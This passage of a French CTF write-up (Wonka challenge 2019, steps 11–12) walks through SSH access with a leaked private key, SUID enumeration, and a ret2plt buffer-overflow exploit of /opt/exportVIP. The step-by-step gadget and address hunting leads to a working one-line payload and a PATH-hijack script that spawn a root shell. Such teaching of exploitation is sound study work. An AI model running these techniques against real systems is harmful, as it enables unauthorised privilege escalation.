j&rsquo;ai trouvé une clé privée dans le <em>home</em> de l&rsquo;utilisateur <strong>Georgina</strong> :</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/writeups/2019_wonkachallenge/step11_worldreadable.png data-srcset="/lib/images/writeups/2019_wonkachallenge/step11_worldreadable.png, /lib/images/writeups/2019_wonkachallenge/step11_worldreadable.png 1.5x, /lib/images/writeups/2019_wonkachallenge/step11_worldreadable.png 2x" data-sizes=auto alt=/lib/images/writeups/2019_wonkachallenge/step11_worldreadable.png title=/lib/images/writeups/2019_wonkachallenge/step11_worldreadable.png></p><p>La clé privée est disponible <a href=https://mega.nz/#!7r5BEYBR!q02ij1f1vGJ8cgXDdrmfkKaHK16cFwngdTuDzqqJ6u8 target=_blank rel="noopener noreffer">ici</a>.</p><p>Il ne reste plus qu&rsquo;à se connecter au même serveur en tant que <em>Georgina</em> :</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>(</span>KaliVM<span class=o>)</span> ➜ chmod <span class=m>0600</span> ~/Documents/id_rsa_georgina 
</span></span><span class=line><span class=cl><span class=o>(</span>KaliVM<span class=o>)</span> ➜  ssh georgina@172.16.69.65 -i ~/Documents/id_rsa_georgina
</span></span><span class=line><span class=cl><span class=o>[</span>...<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=o>(</span>SRV02-BACKUP as Georgina<span class=o>)</span> ➜ cat flag-11.txt 
</span></span><span class=line><span class=cl>5a4fec24bf04c854beee7e2d8678f84814a57243cbea3a7807cd0d5c973ab2d5
</span></span></code></pre></td></tr></table></div></div><h3 id=xi2-flag>XI.2. Flag</h3><blockquote><p>5a4fec24bf04c854beee7e2d8678f84814a57243cbea3a7807cd0d5c973ab2d5</p></blockquote><hr><hr><h2 id=xii-step-12---return-to-plankton>XII. Step 12 - Return to PLankTon</h2><blockquote><p>Pwn2Own</p></blockquote><h3 id=tldr-11>TL;DR</h3><ol><li>Utiliser <strong>LinEnum</strong> afin de trouver <strong>exportVIP</strong> un binaire <em>SUID</em> et <em>SGID</em> ;</li><li>Trouver l&rsquo;overflow de manière empirique ;</li><li>Déterminer le padding (de 296 octets) nécessaire à la réécriture de RSP ;</li><li>Regarder la <strong>plt</strong> du binaire et les protections mises en place, en déduire que l&rsquo;exploitation est un <code>ret2plt</code> ;</li><li>Récupérer l&rsquo;adresse de la fonction <strong>system</strong> disponible dans la <em>plt</em> ;</li><li>Trouver un gadget <code>pop rdi; ret</code> dans le binaire nécessaire pour le placement des arguments ;</li><li>Trouver l&rsquo;adresse d&rsquo;une chaîne de caractère dans le binaire, par exemple <strong>GNU</strong> ;</li><li>Faire un script exécutant un <code>/bin/bash -p</code>, l&rsquo;appeler <strong>GNU</strong> et le rajouter dans le <em>PATH</em> ;</li><li>Exploiter le <code>ret2plt</code> en appelant la fonction <em>system</em> en plaçant <em>GNU</em> en paramètre : <code>/opt/exportVIP &lt; &lt;(python -c 'from pwn import *; print "a"*296+p64(0x000000000040145b)+p64(0x4002d0)+p64(0x40133d)';cat)</code></li></ol><hr><h3 id=xii1-post-exploitation>XII.1. Post exploitation</h3><p>Etant connecté en tant que <em>Georgina</em> ou <em>Violet</em>, le but est d&rsquo;élever ses privilèges et de récupérer un accès <strong>root</strong> au serveur. Pour cela, il existe de nombreux scripts d&rsquo;énumération pour de la post-exploitation sur GitHub. Personnellement, je trouve que <strong>LinEnum</strong> est le plus pertinent. Ci-dessous les résultats importants remontés par <em>LinEnum</em> :</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>(</span>SRV02-BACKUP as Georgina<span class=o>)</span> ➜ ./LinEnum.sh -s -r report -e /dev/shm -t
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>...<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> SUID files:
</span></span><span class=line><span class=cl>-rwsr-xr-x <span class=m>1</span> root root <span class=m>10232</span> mars  <span class=m>28</span>  <span class=m>2017</span> /usr/lib/eject/dmcrypt-get-device
</span></span><span class=line><span class=cl>-rwsr-xr-x <span class=m>1</span> root root <span class=m>440728</span> mars   <span class=m>1</span> 17:19 /usr/lib/openssh/ssh-keysign
</span></span><span class=line><span class=cl>-rwsr-xr-- <span class=m>1</span> root messagebus <span class=m>42992</span> juin   <span class=m>9</span> 23:42 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
</span></span><span class=line><span class=cl>-rwsr-xr-x <span class=m>1</span> root root <span class=m>59680</span> mai   <span class=m>17</span>  <span class=m>2017</span> /usr/bin/passwd
</span></span><span class=line><span class=cl>-rwsr-xr-x <span class=m>1</span> root root <span class=m>50040</span> mai   <span class=m>17</span>  <span class=m>2017</span> /usr/bin/chfn
</span></span><span class=line><span class=cl>-rwsr-xr-x <span class=m>1</span> root root <span class=m>75792</span> mai   <span class=m>17</span>  <span class=m>2017</span> /usr/bin/gpasswd
</span></span><span class=line><span class=cl>-rwsr-xr-x <span class=m>1</span> root root <span class=m>40504</span> mai   <span class=m>17</span>  <span class=m>2017</span> /usr/bin/chsh
</span></span><span class=line><span class=cl>-rwsr-xr-x <span class=m>1</span> root root <span class=m>40312</span> mai   <span class=m>17</span>  <span class=m>2017</span> /usr/bin/newgrp
</span></span><span class=line><span class=cl>-rwsr-xr-x <span class=m>1</span> root root <span class=m>1019656</span> mai   <span class=m>28</span> 22:13 /usr/sbin/exim4
</span></span><span class=line><span class=cl>-rwsr-xr-x <span class=m>1</span> root root <span class=m>40536</span> mai   <span class=m>17</span>  <span class=m>2017</span> /bin/su
</span></span><span class=line><span class=cl>-rwsr-xr-x <span class=m>1</span> root root <span class=m>44304</span> mars   <span class=m>7</span>  <span class=m>2018</span> /bin/mount
</span></span><span class=line><span class=cl>-rwsr-xr-x <span class=m>1</span> root root <span class=m>31720</span> mars   <span class=m>7</span>  <span class=m>2018</span> /bin/umount
</span></span><span class=line><span class=cl>-rwsr-xr-x <span class=m>1</span> root root <span class=m>61240</span> nov.  <span class=m>10</span>  <span class=m>2016</span> /bin/ping
</span></span><span class=line><span class=cl>-rwsr-s---+ <span class=m>1</span> root root <span class=m>14392</span> juil.  <span class=m>8</span> 11:03 /opt/exportVIP
</span></span><span class=line><span class=cl>-rwsr-xr-x <span class=m>1</span> root root <span class=m>110760</span> mars  <span class=m>20</span>  <span class=m>2017</span> /sbin/mount.nfs
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> SGID files:
</span></span><span class=line><span class=cl>-rwxr-sr-x <span class=m>1</span> root mail <span class=m>19008</span> janv. <span class=m>17</span>  <span class=m>2017</span> /usr/bin/dotlockfile
</span></span><span class=line><span class=cl>-rwxr-sr-x <span class=m>1</span> root ssh <span class=m>358624</span> mars   <span class=m>1</span> 17:19 /usr/bin/ssh-agent
</span></span><span class=line><span class=cl>-rwxr-sr-x <span class=m>1</span> root crontab <span class=m>40264</span> oct.   <span class=m>7</span>  <span class=m>2017</span> /usr/bin/crontab
</span></span><span class=line><span class=cl>-rwxr-sr-x <span class=m>1</span> root tty <span class=m>27448</span> mars   <span class=m>7</span>  <span class=m>2018</span> /usr/bin/wall
</span></span><span class=line><span class=cl>-rwxr-sr-x <span class=m>1</span> root shadow <span class=m>71856</span> mai   <span class=m>17</span>  <span class=m>2017</span> /usr/bin/chage
</span></span><span class=line><span class=cl>-rwxr-sr-x <span class=m>1</span> root shadow <span class=m>22808</span> mai   <span class=m>17</span>  <span class=m>2017</span> /usr/bin/expiry
</span></span><span class=line><span class=cl>-rwxr-sr-x <span class=m>1</span> root tty <span class=m>14768</span> avril <span class=m>12</span>  <span class=m>2017</span> /usr/bin/bsd-write
</span></span><span class=line><span class=cl>-rwxr-sr-x <span class=m>1</span> root mail <span class=m>10952</span> déc.  <span class=m>25</span>  <span class=m>2016</span> /usr/bin/dotlock.mailutils
</span></span><span class=line><span class=cl>-rwsr-s---+ <span class=m>1</span> root root <span class=m>14392</span> juil.  <span class=m>8</span> 11:03 /opt/exportVIP
</span></span><span class=line><span class=cl>-rwxr-sr-x <span class=m>1</span> root shadow <span class=m>35592</span> mai   <span class=m>27</span>  <span class=m>2017</span> /sbin/unix_chkpwd
</span></span><span class=line><span class=cl><span class=o>[</span>...<span class=o>]</span>
</span></span></code></pre></td></tr></table></div></div><p>Un seul de ces binaires n&rsquo;est pas un programme par défaut : <strong>/opt/exportVIP</strong>. Si il est possible d&rsquo;exécuter des commandes avec ce binaire, alors il sera possible d&rsquo;exécuter des commandes en tant qu&rsquo;utilisateur <strong>root</strong>. Il est préférable de réaliser l&rsquo;analyse en local, dans un environnement maîtrisé :</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>(</span>KaliVM<span class=o>)</span> ➜ scp -i ~/Documents/id_rsa_georgina georgina@172.16.69.65:/opt/exportVIP .
</span></span></code></pre></td></tr></table></div></div><p>Le binaire est disponible <a href=https://mega.nz/#!DrxxwK6a!1hOFmmYMrImfOaGUC6aIfbTn8oPCyDqwDWgBcKSbz24 target=_blank rel="noopener noreffer">ici</a>.</p><h3 id=xii2-informations-sur-le-binaire>XII.2. Informations sur le binaire</h3><p>C&rsquo;est un binaire 64 bits, strippé et linké dynamiquement :</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>(</span>KaliVM<span class=o>)</span> ➜ file ./exportVIP 
</span></span><span class=line><span class=cl>exportVIP: ELF 64-bit LSB executable, x86-64, version <span class=m>1</span> <span class=o>(</span>SYSV<span class=o>)</span>, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, <span class=k>for</span> GNU/Linux 3.2.0, BuildID<span class=o>[</span>sha1<span class=o>]=</span>46f5d9039533417cd40afbe9f9a7dbdf3726b897, stripped
</span></span></code></pre></td></tr></table></div></div><p>Un <strong>stripped binary</strong> est un binaire sans les symboles de debug. Il est plus léger qu&rsquo;un binaire non strippé. L&rsquo;absence de ces symboles de debug complexifie le reverse du programme. Quant aux protections en place sur <em>exportVIP</em>, il n&rsquo;y en a pas beaucoup :</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>(</span>KaliVM<span class=o>)</span> ➜ checksec --file ./exportVIP
</span></span><span class=line><span class=cl>RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable  FILE
</span></span><span class=line><span class=cl>Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   No Symbols       No	0		4	./exportVIP
</span></span></code></pre></td></tr></table></div></div><p>Merci à <a href=https://twitter.com/tomtombinary target=_blank rel="noopener noreffer">Tomtombinary</a>, pour le schéma ci-dessous, résumant les types d&rsquo;exploitation possibles en fonction des protections activées. <strong>Cependant , veuillez noter que le schéma n&rsquo;est PAS complet</strong>.</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/writeups/2019_wonkachallenge/exploitation_protection.png data-srcset="/lib/images/writeups/2019_wonkachallenge/exploitation_protection.png, /lib/images/writeups/2019_wonkachallenge/exploitation_protection.png 1.5x, /lib/images/writeups/2019_wonkachallenge/exploitation_protection.png 2x" data-sizes=auto alt=/lib/images/writeups/2019_wonkachallenge/exploitation_protection.png title=/lib/images/writeups/2019_wonkachallenge/exploitation_protection.png></p><p>Dans le cadre de l&rsquo;exploitation de <strong>exportVIP</strong>, le <em>bit NX</em> est activé, et sans doute l&rsquo;<em>ASLR</em> . Enfin l&rsquo;outil <strong>readelf</strong> permet d&rsquo;obtenir des informations complémentaires comme les fonctions présentes dans la <em>plt</em>, le contenu de la <em>got</em> et bien d&rsquo;autres choses.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>(</span>KaliVM<span class=o>)</span> ➜ readelf -a ./exportVIP
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>...<span class=o>]</span>
</span></span><span class=line><span class=cl>Section de réadressage <span class=s1>&#39;.rela.plt&#39;</span> à l<span class=se>\&#39;</span>adresse de décalage 0x528 contient <span class=m>8</span> entrées:
</span></span><span class=line><span class=cl>  Décalage        Info           Type           Val.-symboles Noms-symb.+ Addenda
</span></span><span class=line><span class=cl><span class=m>000000404018</span>  <span class=m>000100000007</span> R_X86_64_JUMP_SLO <span class=m>0000000000000000</span> strncpy@GLIBC_2.2.5 + <span class=m>0</span>
</span></span><span class=line><span class=cl><span class=m>000000404020</span>  <span class=m>000200000007</span> R_X86_64_JUMP_SLO <span class=m>0000000000000000</span> puts@GLIBC_2.2.5 + <span class=m>0</span>
</span></span><span class=line><span class=cl><span class=m>000000404028</span>  <span class=m>000300000007</span> R_X86_64_JUMP_SLO <span class=m>0000000000000000</span> strlen@GLIBC_2.2.5 + <span class=m>0</span>
</span></span><span class=line><span class=cl><span class=m>000000404030</span>  <span class=m>000400000007</span> R_X86_64_JUMP_SLO <span class=m>0000000000000000</span> system@GLIBC_2.2.5 + <span class=m>0</span>
</span></span><span class=line><span class=cl><span class=m>000000404038</span>  <span class=m>000500000007</span> R_X86_64_JUMP_SLO <span class=m>0000000000000000</span> printf@GLIBC_2.2.5 + <span class=m>0</span>
</span></span><span class=line><span class=cl><span class=m>000000404040</span>  <span class=m>000600000007</span> R_X86_64_JUMP_SLO <span class=m>0000000000000000</span> snprintf@GLIBC_2.2.5 + <span class=m>0</span>
</span></span><span class=line><span class=cl><span class=m>000000404048</span>  <span class=m>000700000007</span> R_X86_64_JUMP_SLO <span class=m>0000000000000000</span> memset@GLIBC_2.2.5 + <span class=m>0</span>
</span></span><span class=line><span class=cl><span class=m>000000404050</span>  000a00000007 R_X86_64_JUMP_SLO <span class=m>0000000000000000</span> __isoc99_scanf@GLIBC_2.7 + <span class=m>0</span>
</span></span><span class=line><span class=cl><span class=o>[</span>...<span class=o>]</span>
</span></span></code></pre></td></tr></table></div></div><p>La fonction <strong>system</strong> étant présente dans la plt du binaire, cela va nous faciliter l&rsquo;exploitation. En effet, si l&rsquo;on se réfère au schéma de la figure 42, il faudrait leak une adresse de la libc, récupérer l&rsquo;adresse de base de la libc et appeler la fonction <em>system</em>. Geluchat a fait un bon <a href=https://www.dailysecurity.fr/return_oriented_programming/ target=_blank rel="noopener noreffer">article</a> sur son blog à ce sujet.</p><p>Dans le cas du binaire <em>exportVIP</em>, la fonction <em>system</em> est déjà présente dans le programme. Il suffit donc de l&rsquo;appeler en plaçant l&rsquo;argument voulu.</p><h3 id=xii3-explication-de-lexploitation>XII.3. Explication de l&rsquo;exploitation</h3><p>L&rsquo;objectif est d&rsquo;appeler la fonction <em>system</em> avec un paramètre contrôlé. Pour cela, il est impératif de trouver un buffer overflow pour pouvoir réécrire RIP pour rediriger le flux d&rsquo;exécution sur l&rsquo;adresse de <em>system</em>, si on veut résumer. Pour trouver le buffer overflow, il existe deux écoles : reverse en statique ou à grand coup de tests dynamiques (il est possible de mixer les deux). Pour rappel, le binaire ne contient pas les symboles de debug.</p><p>Lorsque le signal système <em>SIGSEGV</em> est levé, cela signifie que le programme concerné à <strong>segmentation fault</strong>. En d&rsquo;autres termes, une fonction du programme a tenté d&rsquo;accéder à une zone mémoire non existante ou non autorisée. Dans le cadre d&rsquo;une exploitation d&rsquo;un buffer overflow, c&rsquo;est une bonne chose, car RIP a bien été réécrit. Il va falloir trouver le bon padding pour réécrire RIP. Dans la convention de l&rsquo;assembleur 64 bits, le premier argument d&rsquo;une fonction se place dans le registre <em>rdi</em>. Afin d&rsquo;exécuter la charge utile, il est possible de trouver une chaîne de caractère dans le programme <em>exportVIP</em>, comme &ldquo;GNU&rdquo; par exemple. Cette chaîne est présente dans tous les ELF (binaire linux).</p><p>Lorsque la chaîne a été choisie, il faut trouver son adresse dans le binaire ; <em>exportVIP</em> n&rsquo;étant pas soumis à la PIE, cette adresse ne changera pas. Enfin, il ne reste qu&rsquo;à créer un script s&rsquo;appelant comme la chaîne choisi et à l&rsquo;ajouter dans le <em>PATH</em>. En résumé, l&rsquo;objectif est de faire :</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=n>system</span><span class=p>(</span><span class=s>&#34;GNU&#34;</span><span class=p>);</span>
</span></span></code></pre></td></tr></table></div></div><p>Pour placer &ldquo;GNU&rdquo; dans <em>rdi</em>, il faut trouver un gadget. Un gadget est une suite d&rsquo;instruction assembleur présente dans le binaire. Il faut donc trouver un gadget <code>pop rdi; ret</code>. Pour rappel, la stack fonctionne comme ceci :</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/writeups/2019_wonkachallenge/stack.jpg data-srcset="/lib/images/writeups/2019_wonkachallenge/stack.jpg, /lib/images/writeups/2019_wonkachallenge/stack.jpg 1.5x, /lib/images/writeups/2019_wonkachallenge/stack.jpg 2x" data-sizes=auto alt=/lib/images/writeups/2019_wonkachallenge/stack.jpg title=/lib/images/writeups/2019_wonkachallenge/stack.jpg></p><p>Au final, le payload d&rsquo;exploitation final devra ressembler à :</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>padding + gadget + adresse de GNU + adresse de system
</span></span></code></pre></td></tr></table></div></div><h3 id=xii4-exploitation>XII.4. Exploitation</h3><h4 id=xii4a-déterminer-le-padding>XII.4.a. Déterminer le padding</h4><p>Lorsque l&rsquo;on cherche le padding d&rsquo;un buffer overflow, la librairie <strong>pwntool</strong> peut être utile, car elle nous permet de générer un pattern. Ce pattern d&rsquo;une taille arbitraire mais suffisamment grande servira à faire <em>segfault</em> le programme. La valeur contenu dans RSP servira à déterminer la taille du padding :</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># generate pattern</span>
</span></span><span class=line><span class=cl><span class=n>cyclic</span><span class=p>(</span><span class=mi>400</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># find offset</span>
</span></span><span class=line><span class=cl><span class=n>find_cyclic</span><span class=p>(</span><span class=s1>&#39;yaac&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=mi>296</span>
</span></span></code></pre></td></tr></table></div></div><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/writeups/2019_wonkachallenge/step12_padding.png data-srcset="/lib/images/writeups/2019_wonkachallenge/step12_padding.png, /lib/images/writeups/2019_wonkachallenge/step12_padding.png 1.5x, /lib/images/writeups/2019_wonkachallenge/step12_padding.png 2x" data-sizes=auto alt=/lib/images/writeups/2019_wonkachallenge/step12_padding.png title=/lib/images/writeups/2019_wonkachallenge/step12_padding.png></p><p>Le padding pour contrôler RIP est de 296 octets.</p><p><em>Note</em> : L&rsquo;instruction <strong>ret</strong> étant un alias pour <code>pop rip</code>, il faut donc observer le contenu du stack pointer, soit <strong>rsp</strong>.</p><h4 id=xii4b-récupérer-ladresse-de-system>XII.4.b. Récupérer l&rsquo;adresse de system</h4><p>Pour trouver l&rsquo;adresse de <code>system</code>, il n&rsquo;est pas nécessaire de sortir l&rsquo;artillerie lourde (IDA Pro, Ghidra&mldr;). Un simple <strong>objdump</strong> fait l&rsquo;affaire :</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>(</span>KaliVM<span class=o>)</span> ➜ objdump -D ./exportVIP <span class=p>|</span> grep system
</span></span><span class=line><span class=cl><span class=m>0000000000401060</span> &lt;system@plt&gt;:
</span></span><span class=line><span class=cl>  40133d:	e8 1e fd ff ff       	callq  <span class=m>401060</span> &lt;system@plt&gt;
</span></span></code></pre></td></tr></table></div></div><p>Le <em>call</em> de <em>system</em> dans le binaire est à l&rsquo;adresse <strong>0x40133d</strong>.</p><h4 id=xii4c-trouver-un-bon-gadget>XII.4.c. Trouver un bon gadget</h4><p>Lister les gadgets d&rsquo;un binaire peut se faire avec l&rsquo;outil <strong>ROPGadget</strong>. Il permet de trouver les différents gadget et leur adresse. Pour rappel on cherche un <code>pop rdi; ret</code> :</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>(</span>KaliVM<span class=o>)</span> ➜ ROPgadget.py --binary ../exportVIP
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>...<span class=o>]</span>
</span></span><span class=line><span class=cl>0x000000000040145b : pop rdi <span class=p>;</span> ret
</span></span><span class=line><span class=cl><span class=o>[</span>...<span class=o>]</span>
</span></span></code></pre></td></tr></table></div></div><p>L&rsquo;adresse du gadget est donc <strong>0x000000000040145b</strong></p><h4 id=xii4d-trouver-ladresse-de-la-chaîne-gnu>XII.4.d. Trouver l&rsquo;adresse de la chaîne GNU</h4><p>La dernière pièce du puzzle est l&rsquo;adresse de la chaîne <strong>GNU</strong> dans <em>exportVIP</em>. Toujours avec <strong>objdump</strong>, il est possible de récupérer l&rsquo;adresse de cette chaîne :</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>(</span>KaliVM<span class=o>)</span> ➜ objdump -s /home/maki/Documents/wonkachall2019/step8/exportVIP
</span></span></code></pre></td></tr></table></div></div><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/writeups/2019_wonkachallenge/step12_gnuaddr.png data-srcset="/lib/images/writeups/2019_wonkachallenge/step12_gnuaddr.png, /lib/images/writeups/2019_wonkachallenge/step12_gnuaddr.png 1.5x, /lib/images/writeups/2019_wonkachallenge/step12_gnuaddr.png 2x" data-sizes=auto alt=/lib/images/writeups/2019_wonkachallenge/step12_gnuaddr.png title=/lib/images/writeups/2019_wonkachallenge/step12_gnuaddr.png></p><p>L&rsquo;adresse de <strong>GNU</strong> n&rsquo;est pas vraiment <strong>0x4002d0</strong>, on peut voir que ce n&rsquo;est pas aligné. Il suffit d&rsquo;enlever 4 octets :</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=o>&gt;&gt;&gt;</span> <span class=nb>hex</span><span class=p>(</span><span class=mh>0x4002d4</span><span class=o>-</span><span class=mh>0x4</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=s1>&#39;0x4002d0&#39;</span>
</span></span></code></pre></td></tr></table></div></div><p>L&rsquo;adresse de <strong>GNU</strong> est : <strong>0x4002d0</strong></p><h4 id=xii4e-ajout-dun-binaire-gnu-dans-le-path>XII.4.e. Ajout d&rsquo;un binaire GNU dans le PATH</h4><p>Le binaire &ldquo;GNU&rdquo; va contenir un simple <code>bash -p</code>, l&rsquo;argument permet de garder les droits de l&rsquo;utilisateur pendant l&rsquo;exécution.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=cp>#!/bin/bash -p
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl>/bin/bash -p
</span></span></code></pre></td></tr></table></div></div><p>Ce script sera stocké dans le dossier <strong>/tmp</strong> :</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>(</span>SRV02-BACKUP as Georgina<span class=o>)</span> ➜ vim /tmp/GNU <span class=c1># Collage du script ci-dessus</span>
</span></span><span class=line><span class=cl><span class=o>(</span>SRV02-BACKUP as Georgina<span class=o>)</span> ➜ chmod <span class=m>777</span> /tmp/GNU
</span></span><span class=line><span class=cl><span class=o>(</span>SRV02-BACKUP as Georgina<span class=o>)</span> ➜ <span class=nb>export</span> <span class=nv>PATH</span><span class=o>=</span><span class=nv>$PATH</span>:/tmp
</span></span></code></pre></td></tr></table></div></div><h3 id=xii5-exécution>XII.5. Exécution</h3><p>Tous les paramètres sont maintenant disponibles : le padding, l&rsquo;adresse du gadget, l&rsquo;adresse de GNU et l&rsquo;adresse de système. Il ne reste plus qu&rsquo;à exploiter.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>(</span>SRV02-BACKUP as Georgina<span class=o>)</span> ➜ /opt/exportVIP &lt; &lt;<span class=o>(</span>python -c <span class=s1>&#39;from pwn import *; print &#34;a&#34;*296+p64(0x000000000040145b)+p64(0x4002d0)+p64(0x40133d)&#39;</span><span class=p>;</span>cat<span class=o>)</span>
</span></span></code></pre></td></tr></table></div></div><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/writeups/2019_wonkachallenge/step12_root.png data-srcset="/lib/images/writeups/2019_wonkachallenge/step12_root.png, /lib/images/writeups/2019_wonkachallenge/step12_root.png 1.5x, /lib/images/writeups/2019_wonkachallenge/step12_root.png 2x" data-sizes=auto alt=/lib/images/writeups/2019_wonkachallenge/step12_root.png title=/lib/images/writeups/2019_wonkachallenge/step12_root.png></p><p><em>Note</em> : La librairie <em>pwntool</em> est disponible sur le serveur distant. C&rsquo;est plutôt rare, mais c&rsquo;est arrangeant.</p><p>Le flag de cette étape se trouve dans le dossier <em>/root</em>.</p><h3 id=xii6-flag>XII.6. Flag</h3><blockquote><p>6f424a5e3b001ee6a832581680169e2f687d8d6e493bdb4b26d518798f7b3c30</p></blockquote><hr><h3 id=resources-9>Resources</h3><ol><li><strong>Rémi Martin</strong>, <em>Exploitation – ByPass ASLR+NX with ret2plt</em>, shoxx-website : <a href=http://shoxx-website.com/2016/05/exploitation-bypass-aslrnx-with-ret2plt.html target=_blank rel="noopener noreffer">http://shoxx-website.com/2016/05/exploitation-bypass-aslrnx-with-ret2plt.html</a></li><li><strong>Geluchat</strong>, <em>Petit 